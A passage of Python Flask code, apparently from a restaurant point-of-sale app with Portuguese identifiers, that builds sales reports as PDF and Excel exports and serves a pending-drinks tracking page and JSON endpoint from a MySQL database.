            categoria = item.get('categoria', '')
            nome_item = item.get('nome_item', '')

            total_vendas += preco_venda

            if custo_unitario > 0:
                lucro_liq += preco_venda - (custo_unitario * quantidade)
            else:
                if tipo == 'Prato_Dinamico' or 'Prato Dinâmico' in nome_item:
                    lucro_liq += preco_venda * MEDIA_LUCRO_PRATO_DINAMICO
                elif tipo == 'Sobremesa_Dinamica' or 'Sobremesa' in nome_item:
                    lucro_liq += preco_venda * MEDIA_LUCRO_SOBREMESA_DINAMICA
                elif tipo == 'Item_Variado_Dinamico' or categoria == 'Outros':
                    lucro_liq += preco_venda * MEDIA_LUCRO_ITEM_VARIADO

        percentual = (lucro_liq / total_vendas * 100) if total_vendas > 0 else 0

        if not inicio_bloco:
            inicio_bloco = data_dia
        bloco_atual.append({
            "data": data_dia,
            "entradas": total_vendas,
            "lucro": lucro_liq,
            "percentual": percentual
        })

        if len(bloco_atual) == 5 or d == dias[-1]:
            fim_bloco = bloco_atual[-1]['data']
            periodo = f"{inicio_bloco.strftime('%d/%m')} - {fim_bloco.strftime('%d/%m')}"
            blocos.append({
                "periodo": periodo,
                "dados": bloco_atual.copy()
            })
            bloco_atual.clear()
            inicio_bloco = None

    conn.close()

    # --- Geração do PDF ---
    buffer = BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=A4,
                            leftMargin=1.2*cm, rightMargin=1.2*cm,
                            topMargin=1.2*cm, bottomMargin=1.2*cm)

    style_titulo = ParagraphStyle(name="Titulo", fontSize=13, alignment=TA_CENTER, textColor=colors.white)
    cor_titulo = colors.HexColor("#00A0A0")
    cor_header = colors.HexColor("#C93227")
    cor_total = colors.HexColor("#FFBF00")

    story = []

    for bloco in blocos:
        periodo = bloco["periodo"]
        dados = bloco["dados"]

        story.append(Spacer(1, 0.3*cm))
        story.append(Table(
            [[Paragraph(f"Relatório de Entradas: {periodo}", style_titulo)]],
            colWidths=[17.5*cm],
            style=[
                ('BACKGROUND', (0, 0), (-1, -1), cor_titulo),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('TEXTCOLOR', (0, 0), (-1, -1), colors.white),
                ('FONTSIZE', (0, 0), (-1, -1), 12)
            ]
        ))
        story.append(Spacer(1, 0.2*cm))

        data_table = [["DATA", "ENTRADAS", "LUCRO LIQ.", "Percentual de Lucro"]]
        total_entradas = 0
        total_lucro = 0
        total_perc = 0

        for linha in dados:
            data_table.append([
                linha["data"].strftime('%d/%m/%Y'),
                f"R$ {linha['entradas']:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
                f"R$ {linha['lucro']:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
                f"{linha['percentual']:.0f}%"
            ])
            total_entradas += linha["entradas"]
            total_lucro += linha["lucro"]
            total_perc += linha["percentual"]

        media_perc = total_perc / len(dados) if dados else 0
        data_table.append([
            "TOTAL",
            f"R$ {total_entradas:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
            f"R$ {total_lucro:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
            f"MÉDIA = {media_perc:.1f}%"
        ])

        tabela = Table(data_table, colWidths=[4.0*cm, 4.0*cm, 4.0*cm, 5.0*cm])
        tabela.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), cor_header),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 9),
            ('BACKGROUND', (0, -1), (-1, -1), cor_total),
            ('TEXTCOLOR', (0, -1), (-1, -1), colors.black),
            ('GRID', (0, 0), (-1, -1), 0.5, colors.grey)
        ]))
        story.append(tabela)
        story.append(Spacer(1, 0.5*cm))

    doc.build(story)
    buffer.seek(0)
    return send_file(buffer, mimetype='application/pdf', as_attachment=True, download_name="relatorio_entradas.pdf")


# --- ROTAS DE EXPORTAÇÃO PARA EXCEL ---

@app.route('/gerar_excel_mensal')
def gerar_excel_mensal():
    if 'relatorio_mensal_data' not in session or not session['relatorio_mensal_data']:
        flash('Nenhum dado de relatório mensal encontrado para exportar. Por favor, gere o relatório primeiro.', 'error')
        return redirect(url_for('relatorios_web'))

    data = session['relatorio_mensal_data']
    resultados = data['resultados']
    mes_nome_f = data['mes_nome_f']
    ano_f = data['ano_f']

    wb = Workbook()
    
    # Cores
    cor_vermelho_comenza_hex = "C93227"
    cor_ciano_comenza_hex = "00A0A0"
    cor_laranja_comenza_hex = "FF8C00"

    fill_vermelho = PatternFill(start_color=cor_vermelho_comenza_hex, end_color=cor_vermelho_comenza_hex, fill_type="solid")
    fill_ciano = PatternFill(start_color=cor_ciano_comenza_hex, end_color=cor_ciano_comenza_hex, fill_type="solid")
    fill_laranja = PatternFill(start_color=cor_laranja_comenza_hex, end_color=cor_laranja_comenza_hex, fill_type="solid")
    
    font_branca = Font(color="FFFFFF")
    font_preta = Font(color="000000")
    thin_border = Border(left=Side(style='thin'), right=Side(style='thin'), top=Side(style='thin'), bottom=Side(style='thin'))

    # Aba: Resumo Mensal
    ws_resumo = wb.active
    ws_resumo.title = "Resumo Mensal"
    
    ws_resumo['A1'] = f"Relatório Mensal de Vendas - {mes_nome_f} de {ano_f}"
    ws_resumo['A1'].font = Font(bold=True, size=16, color=cor_vermelho_comenza_hex)
    ws_resumo['A1'].alignment = Alignment(horizontal='center')
    ws_resumo.merge_cells('A1:B1')

    ws_resumo['A3'] = "Total de Pedidos Fechados:"
    ws_resumo['B3'] = resultados.get('total_pedidos_mes', 0)
    ws_resumo['A4'] = "Valor Total de Vendas:"
    ws_resumo['B4'] = f"R$ {resultados.get('total_vendas_mes', 0.00):.2f}"
    ws_resumo['A5'] = "Ticket Médio por Pedido:"
    ws_resumo['B5'] = f"R$ {resultados.get('ticket_medio_mes', 0.00):.2f}"

    ws_resumo['B4'].fill = fill_laranja
    ws_resumo['B5'].fill = fill_laranja
    ws_resumo['B4'].font = font_preta
    ws_resumo['B5'].font = font_preta

    ws_resumo.column_dimensions['A'].width = 35
    ws_resumo.column_dimensions['B'].width = 20

    # Aba: Marmitas Mais Vendidas
    if resultados.get('marmitas_mais_vendidas'):
        ws_marmitas = wb.create_sheet("Marmitas + Vendidas")
        ws_marmitas.append(["Marmita", "Total Vendido"])
        for col_idx, cell in enumerate(ws_marmitas[1]):
            cell.fill = fill_ciano
            cell.font = font_preta
            cell.font = Font(bold=True)
            cell.border = thin_border
        for item in resultados['marmitas_mais_vendidas']:
            ws_marmitas.append([item['nome_item'], item['total_vendido']])
        for col in ws_marmitas.columns:
            max_length = 0
            column = get_column_letter(col[0].column)
            for cell in col:
                try:
                    if cell.value is not None and len(str(cell.value)) > max_length: max_length = len(str(cell.value))
                except: pass
            ws_marmitas.column_dimensions[column].width = max_length + 2
            for cell in col: cell.border = thin_border

    # Aba: Bebidas Mais Vendidas
    if resultados.get('bebidas_mais_vendidas'):
        ws_bebidas = wb.create_sheet("Bebidas + Vendidas")
        ws_bebidas.append(["Bebida", "Total Vendido"])
        for col_idx, cell in enumerate(ws_bebidas[1]):
            cell.fill = fill_ciano
            cell.font = font_preta
            cell.font = Font(bold=True)
            cell.border = thin_border
        for item in resultados['bebidas_mais_vendidas']:
            ws_bebidas.append([item['nome_item'], item['total_vendido']])
        for col in ws_bebidas.columns:
            max_length = 0
            column = get_column_letter(col[0].column)
            for cell in col:
                try:
                    if cell.value is not None and len(str(cell.value)) > max_length: max_length = len(str(cell.value))
                except: pass
            ws_bebidas.column_dimensions[column].width = max_length + 2
            for cell in col: cell.border = thin_border

    # Aba: Vendas por Categoria
    if resultados.get('vendas_por_categoria'):
        ws_categoria = wb.create_sheet("Vendas por Categoria")
        ws_categoria.append(["Categoria", "Total Vendas (R$)"])
        for col_idx, cell in enumerate(ws_categoria[1]):
            cell.fill = fill_ciano
            cell.font = font_preta
            cell.font = Font(bold=True)
            cell.border = thin_border
        for categoria, total in resultados['vendas_por_categoria'].items():
            ws_categoria.append([categoria, f"R$ {total:.2f}"])
        for col in ws_categoria.columns:
            max_length = 0
            column = get_column_letter(col[0].column)
            for cell in col:
                try:
                    if cell.value is not None and len(str(cell.value)) > max_length: max_length = len(str(cell.value))
                except: pass
            ws_categoria.column_dimensions[column].width = max_length + 2
            for cell in col: cell.border = thin_border

    # Aba: Vendas por Forma de Pagamento
    if resultados.get('vendas_por_forma_pagamento'):
        ws_pagamento = wb.create_sheet("Vendas por Pgto")
        ws_pagamento.append(["Forma de Pagamento", "Total Pago (R$)"])
        for col_idx, cell in enumerate(ws_pagamento[1]):
            cell.fill = fill_ciano
            cell.font = font_preta
            cell.font = Font(bold=True)
            cell.border = thin_border
        for item in resultados['vendas_por_forma_pagamento']:
            ws_pagamento.append([item['forma_pagamento'], f"R$ {item['total_pago']:.2f}"])
        for col in ws_pagamento.columns:
            max_length = 0
            column = get_column_letter(col[0].column)
            for cell in col:
                try:
                    if cell.value is not None and len(str(cell.value)) > max_length: max_length = len(str(cell.value))
                except: pass
            ws_pagamento.column_dimensions[column].width = max_length + 2
            for cell in col: cell.border = thin_border

    output = BytesIO()
    wb.save(output)
    output.seek(0)

    return send_file(output, 
                     mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                     download_name=f'relatorio_mensal_{mes_nome_f}_{ano_f}.xlsx',
                     as_attachment=True)

@app.route('/gerar_pdf_mensal')
def gerar_pdf_mensal():
    if 'relatorio_mensal_data' not in session or not session['relatorio_mensal_data']:
        flash('Nenhum dado de relatório mensal encontrado para exportar. Por favor, gere o relatório primeiro.', 'error')
        return redirect(url_for('relatorios_web'))

    data = session['relatorio_mensal_data']
    resultados = data['resultados']
    mes_nome_f = data['mes_nome_f']
    ano_f = data['ano_f']

    buffer = BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=A4,
                            rightMargin=cm, leftMargin=cm,
                            topMargin=2*cm, bottomMargin=2*cm)
    styles = getSampleStyleSheet()
    story = []

    # Cores para PDF (ReportLab)
    cor_vermelho_comenza = colors.HexColor("#C93227")
    cor_ciano_comenza = colors.HexColor("#00A0A0")
    cor_laranja_comenza = colors.HexColor("#FF8C00")

    # Estilos de parágrafo
    style_h1 = ParagraphStyle(name='H1_Custom', parent=styles['h1'], alignment=TA_CENTER, textColor=cor_vermelho_comenza)
    style_h2 = ParagraphStyle(name='H2_Custom', parent=styles['h2'], alignment=TA_LEFT, textColor=cor_vermelho_comenza)
    style_body = styles['Normal']
    style_body_bold = ParagraphStyle(name='Body_Bold', parent=style_body, fontName='Helvetica-Bold')
    # style_summary_value = ParagraphStyle(name='SummaryValue', parent=style_body_bold, textColor=cor_laranja_comenza) # Não é usado diretamente

    # Título Principal
    story.append(Paragraph(f"Relatório Mensal de Vendas - {mes_nome_f} de {ano_f}", style_h1))
    story.append(Spacer(1, 0.5*cm))

    # Resumo do Mês
    story.append(Paragraph("Resumo do Mês:", style_h2))
    story.append(Paragraph(f"Total de Pedidos Fechados: {resultados.get('total_pedidos_mes', 0)}", style_body))
    # CORREÇÃO: Chamar .hexval() para obter a string de cor
    story.append(Paragraph(f"Valor Total de Vendas: <font color='{cor_laranja_comenza.hexval()}'>R$ {resultados.get('total_vendas_mes', 0.00):.2f}</font>", style_body))
    story.append(Paragraph(f"Ticket Médio por Pedido: <font color='{cor_laranja_comenza.hexval()}'>R$ {resultados.get('ticket_medio_mes', 0.00):.2f}</font>", style_body))
    story.append(Spacer(1, 0.8*cm))

    # Marmitas Mais Vendidas
    if resultados.get('marmitas_mais_vendidas'):
        story.append(Paragraph("Produtos Mais Vendidos (Marmitas)", style_h2))
        data_table = [['Marmita', 'Total Vendido']]
        for item in resultados['marmitas_mais_vendidas']:
            data_table.append([item['nome_item'], item['total_vendido']])
        
        table_style = TableStyle([
            ('BACKGROUND', (0,0), (-1,0), cor_ciano_comenza),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('BOTTOMPADDING', (0,0), (-1,0), 6),
            ('BACKGROUND', (0,1), (-1,-1), colors.white), # Fundo branco para as linhas de dados
            ('GRID', (0,0), (-1,-1), 1, colors.lightgrey)
        ])
        table = Table(data_table)
        table.setStyle(table_style)
        story.append(table)
        story.append(Spacer(1, 0.5*cm))

    # Bebidas Mais Vendidas
    if resultados.get('bebidas_mais_vendidas'):
        story.append(Paragraph("Produtos Mais Vendidos (Bebidas)", style_h2))
        data_table = [['Bebida', 'Total Vendido']]
        for item in resultados['bebidas_mais_vendidas']:
            data_table.append([item['nome_item'], item['total_vendido']])
        
        table_style = TableStyle([
           
            ('BACKGROUND', (0,0), (-1,0), cor_ciano_comenza),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('BOTTOMPADDING', (0,0), (-1,0), 6),
            ('BACKGROUND', (0,1), (-1,-1), colors.white),
            ('GRID', (0,0), (-1,-1), 1, colors.lightgrey)
        ])
        table = Table(data_table)
        table.setStyle(table_style)
        story.append(table)
        story.append(Spacer(1, 0.5*cm))

    # Vendas por Categoria
    if resultados.get('vendas_por_categoria'):
        story.append(Paragraph("Vendas por Categoria de Item", style_h2))
        data_table = [['Categoria', 'Total Vendas (R$)']]
        for categoria, total in resultados['vendas_por_categoria'].items():
            data_table.append([categoria, f"R$ {total:.2f}"])
        
        table_style = TableStyle([
            ('BACKGROUND', (0,0), (-1,0), cor_ciano_comenza),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('BOTTOMPADDING', (0,0), (-1,0), 6),
            ('BACKGROUND', (0,1), (-1,-1), colors.white),
            ('GRID', (0,0), (-1,-1), 1, colors.lightgrey)
        ])
        table = Table(data_table)
        table.setStyle(table_style)
        story.append(table)
        story.append(Spacer(1, 0.5*cm))

    # Vendas por Forma de Pagamento
    if resultados.get('vendas_por_forma_pagamento'):
        story.append(Paragraph("Vendas por Forma de Pagamento", style_h2))
        data_table = [['Forma de Pagamento', 'Total Pago (R$)']]
        for item in resultados['vendas_por_forma_pagamento']:
            data_table.append([item['forma_pagamento'], f"R$ {item['total_pago']:.2f}"])
        
        table_style = TableStyle([
            ('BACKGROUND', (0,0), (-1,0), cor_ciano_comenza),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('BOTTOMPADDING', (0,0), (-1,0), 6),
            ('BACKGROUND', (0,1), (-1,-1), colors.white),
            ('GRID', (0,0), (-1,-1), 1, colors.lightgrey)
        ])
        table = Table(data_table)
        table.setStyle(table_style)
        story.append(table)
        story.append(Spacer(1, 0.5*cm))

    doc.build(story)
    buffer.seek(0)
    return send_file(buffer, mimetype='application/pdf', download_name=f'relatorio_mensal_{mes_nome_f}_{ano_f}.pdf', as_attachment=True)


@app.route('/gerar_excel_diario')
def gerar_excel_diario():
    if 'relatorio_diario_data' not in session or not session['relatorio_diario_data']:
        flash('Nenhum dado de relatório diário encontrado para exportar. Por favor, gere o relatório primeiro.', 'error')
        return redirect(url_for('relatorio_diario_web'))

    data = session['relatorio_diario_data']
    resultados = data['resultados']
    data_relatorio_str = data['data_relatorio']
    data_relatorio_obj = datetime.strptime(data_relatorio_str, '%Y-%m-%d').date()
    
    wb = Workbook()

    cor_vermelho_comenza_hex = "C93227"
    cor_ciano_comenza_hex = "00A0A0"
    cor_laranja_comenza_hex = "FF8C00"

    fill_vermelho = PatternFill(start_color=cor_vermelho_comenza_hex, end_color=cor_vermelho_comenza_hex, fill_type="solid")
    fill_ciano = PatternFill(start_color=cor_ciano_comenza_hex, end_color=cor_ciano_comenza_hex, fill_type="solid")
    fill_laranja = PatternFill(start_color=cor_laranja_comenza_hex, end_color=cor_laranja_comenza_hex, fill_type="solid")
    
    font_branca = Font(color="FFFFFF")
    font_preta = Font(color="000000")
    thin_border = Border(left=Side(style='thin'), right=Side(style='thin'), top=Side(style='thin'), bottom=Side(style='thin'))

    # Aba: Resumo Diário
    ws_resumo_diario = wb.active
    ws_resumo_diario.title = "Resumo Diario"
    
    ws_resumo_diario['A1'] = f"Relatório Diário de Vendas - {data_relatorio_obj.strftime('%d/%m/%Y')}"
    ws_resumo_diario['A1'].font = Font(bold=True, size=16, color=cor_vermelho_comenza_hex)
    ws_resumo_diario['A1'].alignment = Alignment(horizontal='center')
    ws_resumo_diario.merge_cells('A1:B1')

    ws_resumo_diario['A3'] = "Total de Pedidos Fechados:"
    ws_resumo_diario['B3'] = resultados.get('total_pedidos_dia', 0)
    ws_resumo_diario['A4'] = "Valor Total de Vendas:"
    ws_resumo_diario['B4'] = f"R$ {resultados.get('valor_total_vendas_dia', 0.00):.2f}"

    ws_resumo_diario['B4'].fill = fill_laranja
    ws_resumo_diario['B4'].font = font_preta

    ws_resumo_diario.column_dimensions['A'].width = 35
    ws_resumo_diario.column_dimensions['B'].width = 20

    # Aba: Vendas por Forma de Pagamento no Dia
    if resultados.get('vendas_por_forma_pagamento_dia'):
        ws_pagamento_diario = wb.create_sheet("Vendas por Pgto Diario")
        ws_pagamento_diario.append(["Forma de Pagamento", "Total Pago (R$)"])
        for col_idx, cell in enumerate(ws_pagamento_diario[1]):
            cell.fill = fill_ciano
            cell.font = font_preta
            cell.font = Font(bold=True)
            cell.border = thin_border
        for item in resultados['vendas_por_forma_pagamento_dia']:
            ws_pagamento_diario.append([item['forma_pagamento'], f"R$ {item['total_pago']:.2f}"])
        for col in ws_pagamento_diario.columns:
            max_length = 0
            column = get_column_letter(col[0].column)
            for cell in col:
                try:
                    if cell.value is not None and len(str(cell.value)) > max_length: max_length = len(str(cell.value))
                except: pass
            ws_pagamento_diario.column_dimensions[column].width = max_length + 2
            for cell in col: cell.border = thin_border

    # Aba: Itens Vendidos no Dia
    if resultados.get('itens_vendidos_dia'):
        ws_itens_diario = wb.create_sheet("Itens Vendidos Diario")
        ws_itens_diario.append(["Item", "Categoria", "Quantidade Total", "Valor Total do Item (R$)"])
        for col_idx, cell in enumerate(ws_itens_diario[1]):
            cell.fill = fill_ciano
            cell.font = font_preta
            cell.font = Font(bold=True)
            cell.border = thin_border
        for item in resultados['itens_vendidos_dia']:
            ws_itens_diario.append([
                item['nome_item'],
                item['categoria'],
                item['total_vendido'],
                f"R$ {item['valor_total_item']:.2f}"
            ])
        for col in ws_itens_diario.columns:
            max_length = 0
            column = get_column_letter(col[0].column)
            for cell in col:
                try:
                    if cell.value is not None and len(str(cell.value)) > max_length: max_length = len(str(cell.value))
                except: pass
            ws_itens_diario.column_dimensions[column].width = max_length + 2
            for cell in col: cell.border = thin_border

    output = BytesIO()
    wb.save(output)
    output.seek(0)

    return send_file(output, 
                     mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                     download_name=f'relatorio_diario_{data_relatorio_obj.strftime("%Y%m%d")}.xlsx',
                     as_attachment=True)

@app.route('/gerar_pdf_diario')
def gerar_pdf_diario():
    if 'relatorio_diario_data' not in session or not session['relatorio_diario_data']:
        flash('Nenhum dado de relatório diário encontrado para exportar. Por favor, gere o relatório primeiro.', 'error')
        return redirect(url_for('relatorio_diario_web'))

    data = session['relatorio_diario_data']
    resultados = data['resultados']
    data_relatorio_str = data['data_relatorio']
    data_relatorio_obj = datetime.strptime(data_relatorio_str, '%Y-%m-%d').date()

    buffer = BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=A4,
                            rightMargin=cm, leftMargin=cm,
                            topMargin=2*cm, bottomMargin=2*cm)
    styles = getSampleStyleSheet()
    story = []

    cor_vermelho_comenza = colors.HexColor("#C93227")
    cor_ciano_comenza = colors.HexColor("#00A0A0")
    cor_laranja_comenza = colors.HexColor("#FF8C00")

    style_h1 = ParagraphStyle(name='H1_Custom', parent=styles['h1'], alignment=TA_CENTER, textColor=cor_vermelho_comenza)
    style_h2 = ParagraphStyle(name='H2_Custom', parent=styles['h2'], alignment=TA_LEFT, textColor=cor_vermelho_comenza)
    style_body = styles['Normal']

    story.append(Paragraph(f"Relatório Diário de Vendas - {data_relatorio_obj.strftime('%d/%m/%Y')}", style_h1))
    story.append(Spacer(1, 0.5*cm))

    # Resumo do Dia
    story.append(Paragraph("Resumo do Dia:", style_h2))
    story.append(Paragraph(f"Total de Pedidos Fechados: {resultados.get('total_pedidos_dia', 0)}", style_body))
    # CORREÇÃO: Chamar .hexval() para obter a string de cor
    story.append(Paragraph(f"Valor Total de Vendas: <font color='{cor_laranja_comenza.hexval()}'>R$ {resultados.get('valor_total_vendas_dia', 0.00):.2f}</font>", style_body))
    story.append(Spacer(1, 0.8*cm))

    # Vendas por Forma de Pagamento
    if resultados.get('vendas_por_forma_pagamento_dia'):
        story.append(Paragraph("Vendas por Forma de Pagamento", style_h2))
        data_table = [['Forma de Pagamento', 'Total Pago (R$)']]
        for item in resultados['vendas_por_forma_pagamento_dia']:
            data_table.append([item['forma_pagamento'], f"R$ {item['total_pago']:.2f}"])
        
        table_style = TableStyle([
            ('BACKGROUND', (0,0), (-1,0), cor_ciano_comenza),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('BOTTOMPADDING', (0,0), (-1,0), 6),
            ('BACKGROUND', (0,1), (-1,-1), colors.white),
            ('GRID', (0,0), (-1,-1), 1, colors.lightgrey)
        ])
        table = Table(data_table)
        table.setStyle(table_style)
        story.append(table)
        story.append(Spacer(1, 0.5*cm))

    # Itens Vendidos no Dia
    if resultados.get('itens_vendidos_dia'):
        story.append(Paragraph("Itens Vendidos no Dia", style_h2))
        data_table = [['Item', 'Categoria', 'Quantidade Total', 'Valor Total do Item (R$)']]
        for item in resultados['itens_vendidos_dia']:
            data_table.append([
                item['nome_item'],
                item['categoria'],
                item['total_vendido'],
                f"R$ {item['valor_total_item']:.2f}"
            ])
        
        table_style = TableStyle([
            ('BACKGROUND', (0,0), (-1,0), cor_ciano_comenza),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('BOTTOMPADDING', (0,0), (-1,0), 6),
            ('BACKGROUND', (0,1), (-1,-1), colors.white),
            ('GRID', (0,0), (-1,-1), 1, colors.lightgrey)
        ])
        table = Table(data_table)
        table.setStyle(table_style)
        story.append(table)
        story.append(Spacer(1, 0.5*cm))

    doc.build(story)
    buffer.seek(0)
    return send_file(buffer, mimetype='application/pdf', download_name=f'relatorio_diario_{data_relatorio_obj.strftime("%Y%m%d")}.pdf', as_attachment=True)


@app.route('/gerar_excel_detalhado')
def gerar_excel_detalhado():
    if 'relatorio_detalhado_data' not in session or not session['relatorio_detalhado_data']:
        flash('Nenhum dado de relatório detalhado encontrado para exportar. Por favor, gere o relatório primeiro.', 'error')
        return redirect(url_for('relatorio_detalhado_web'))

    data = session['relatorio_detalhado_data']
    pedidos_detalhados = data['pedidos_detalhados']
    data_relatorio_str = data['data_relatorio']
    data_relatorio_obj = datetime.strptime(data_relatorio_str, '%Y-%m-%d').date()

    wb = Workbook()
    ws = wb.active
    ws.title = "Relatorio Detalhado"

    cor_vermelho_comenza_hex = "C93227"
    cor_ciano_comenza_hex = "00A0A0"
    cor_laranja_comenza_hex = "FF8C00"

    fill_vermelho = PatternFill(start_color=cor_vermelho_comenza_hex, end_color=cor_vermelho_comenza_hex, fill_type="solid")
    fill_ciano = PatternFill(start_color=cor_ciano_comenza_hex, end_color=cor_ciano_comenza_hex, fill_type="solid")
    fill_laranja = PatternFill(start_color=cor_laranja_comenza_hex, end_color=cor_laranja_comenza_hex, fill_type="solid")
    
    font_branca = Font(color="FFFFFF")
    font_preta = Font(color="000000")
    thin_border = Border(left=Side(style='thin'), right=Side(style='thin'), top=Side(style='thin'), bottom=Side(style='thin'))

    ws['A1'] = f"Relatório Detalhado de Pedidos Fechados em: {data_relatorio_obj.strftime('%d/%m/%Y')}"
    ws['A1'].font = Font(bold=True, size=16, color=cor_vermelho_comenza_hex)
    ws['A1'].alignment = Alignment(horizontal='center')
    ws.merge_cells('A1:G1')

    headers = ["Comanda", "ID Pedido", "Aberto em", "Fechado em", "Valor Final", "Forma Pgto.", "Itens"]
    ws.append([]) # Linha vazia para espaçamento
    ws.append(headers)

    for col_idx, cell in enumerate(ws[ws.max_row]):
        cell.fill = fill_ciano
        cell.font = font_preta
        cell.font = Font(bold=True)
        cell.border = thin_border

    for pedido in pedidos_detalhados:
        ws.append([
            pedido['comanda_id'],
            pedido['pedido_id'],
            pedido['data_abertura'].strftime('%d/%m/%Y %H:%M') if pedido['data_abertura'] else 'N/A',
            pedido['data_fechamento'].strftime('%d/%m/%Y %H:%M') if pedido['data_fechamento'] else 'N/A',
            f"R$ {pedido['valor_total']:.2f}",
            pedido['forma_pagamento'] if pedido['forma_pagamento'] else 'N/A',
            pedido['itens_formatados'] if pedido['itens_formatados'] else 'Nenhum item registrado'
        ])
    
    for col in ws.columns:
        max_length = 0
        column = get_column_letter(col[0].column)
        for cell in col:
            try:
                if cell.value is not None and len(str(cell.value)) > max_length: max_length = len(str(cell.value))
            except: pass
        ws.column_dimensions[column].width = max_length + 2
        for cell in col: cell.border = thin_border

    output = BytesIO()
    wb.save(output)
    output.seek(0)

    return send_file(output, 
                     mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                     download_name=f'relatorio_detalhado_{data_relatorio_obj.strftime("%Y%m%d")}.xlsx',
                     as_attachment=True)

@app.route('/acompanhamento_bebidas', methods=['GET', 'POST'])
def acompanhamento_bebidas():
    conn = get_db_connection()
    if conn is None:
        flash("Erro ao conectar ao banco de dados.", 'error')
        return render_template('acompanhamento_bebidas.html', bebidas=[])
    cursor = conn.cursor(pymysql.cursors.DictCursor)
    try:
        if request.method == 'POST':
            item_id = request.form.get('item_id')
            if item_id:
                cursor.execute("UPDATE pedido_itens SET entregue = TRUE WHERE id = %s", (item_id,))
                conn.commit()
                flash("Bebida marcada como entregue.", 'success')
        cursor.execute("""
            SELECT pi.id, pi.nome_item, pi.observacao_item, pi.quantidade, p.comanda_id
            FROM pedido_itens pi
            JOIN pedidos p ON pi.pedido_id = p.id
            WHERE (pi.tipo_item_pedido = 'Bebida' OR pi.categoria_item_pedido = 'Bebida')
              AND pi.entregue = FALSE
              AND p.situacao = 'ABERTO'
            ORDER BY pi.data_adicao ASC
        """)
        bebidas = cursor.fetchall()
    except Exception as e:
        flash(f"Erro: {e}", 'error')
        bebidas = []
    finally:
        cursor.close()
        conn.close()
    return render_template('acompanhamento_bebidas.html', bebidas=bebidas, **get_template_date_vars())
# ...existing code...

@app.route('/api/bebidas_pendentes')
def api_bebidas_pendentes():
    conn = get_db_connection()
    if conn is None:
        return jsonify([])

    cursor = conn.cursor(pymysql.cursors.DictCursor)
    try:
        cursor.execute("""
            SELECT
                pi.id,
                pi.nome_item,
                COALESCE(pi.descricao_item, pi.observacao_item, '') AS descricao_item,
                pi.observacao_item,
                pi.quantidade,
                p.comanda_id
            FROM pedido_itens pi
            JOIN pedidos p ON pi.pedido_id = p.id
            WHERE (pi.tipo_item_pedido = 'Bebida' OR pi.categoria_item_pedido = 'Bebida')
              AND pi.entregue = FALSE
              AND p.situacao = 'ABERTO'
              AND (pi.observacao_item NOT LIKE '%%Para marmita%%' OR pi.observacao_item IS NULL)
            ORDER BY pi.data_adicao ASC
        """)
        bebidas = cursor.fetchall()
    except Exception:
        bebidas = []
    finally:
        cursor.close()
        conn.close()

    return jsonify(bebidas)
# ...existing code...


@app.route('/gerar_pdf_detalhado')
def gerar_pdf_detalhado():
    if 'relatorio_detalhado_data' not in session or not session['relatorio_detalhado_data']:
        flash('Nenhum dado de relatório detalhado encontrado para exportar. Por favor, gere o relatório primeiro.', 'error')
        return redirect(url_for('relatorio_detalhado_web'))

    data = session['relatorio_detalhado_data']
    pedidos_detalhados = data['pedidos_detalhados']
    data_relatorio_str = data['data_relatorio']
    data_relatorio_obj = datetime.strptime(data_relatorio_str, '%Y-%m-%d').date()

    buffer = BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=A4,
                            rightMargin=cm, leftMargin=cm,
                            topMargin=2*cm, bottomMargin=2*cm)
    styles = getSampleStyleSheet()
    story = []

    cor_vermelho_comenza = colors.HexColor("#C93227")
    cor_ciano_comenza = colors.HexColor("#00A0A0")
    cor_laranja_comenza = colors.HexColor("#FF8C00")

    style_h1 = ParagraphStyle(name='H1_Custom', parent=styles['h1'], alignment=TA_CENTER, textColor=cor_vermelho_comenza)
    style_h2 = ParagraphStyle(name='H2_Custom', parent=styles['h2'], alignment=TA_LEFT, textColor=cor_vermelho_comenza)
    style_body = styles['Normal']

    story.append(Paragraph(f"Relatório Detalhado de Pedidos Fechados em: {data_relatorio_obj.strftime('%d/%m/%Y')}", style_h1))
    story.append(Spacer(1, 0.5*cm))

    if pedidos_detalhados:
        data_table = [["Comanda", "ID Pedido", "Aberto em", "Fechado em", "Valor Final", "Forma Pgto.", "Itens"]]
        for pedido in pedidos_detalhados:
            data_table.append([
                pedido['comanda_id'],
                pedido['pedido_id'],
                pedido['data_abertura'].strftime('%d/%m/%Y %H:%M') if pedido['data_abertura'] else 'N/A',
                pedido['data_fechamento'].strftime('%d/%m/%Y %H:%M') if pedido['data_fechamento'] else 'N/A',
